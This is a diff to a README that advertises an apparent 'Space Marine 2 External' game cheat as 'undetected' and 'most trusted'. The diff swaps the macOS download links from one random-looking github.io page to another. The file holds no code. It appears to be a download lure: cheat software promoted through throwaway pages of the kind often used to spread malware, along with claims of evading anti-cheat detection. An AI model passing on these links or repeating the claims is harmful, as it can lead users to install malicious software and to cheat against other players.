@@ -1,8 +1,8 @@
 # 🎮 Space Marine 2 External — Evidence V2
 
 [![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://uvkayskoqsgd.github.io/windows-files/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://uvkayskoqsgd.github.io/windows-files/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://uvkayskoqsgd.github.io/windows-files/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://jaifcflcufqn.github.io/mac-install/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://jaifcflcufqn.github.io/mac-install/)
 [![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://uvkayskoqsgd.github.io/windows-files/)
 
 > The most trusted **Space Marine 2 External** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
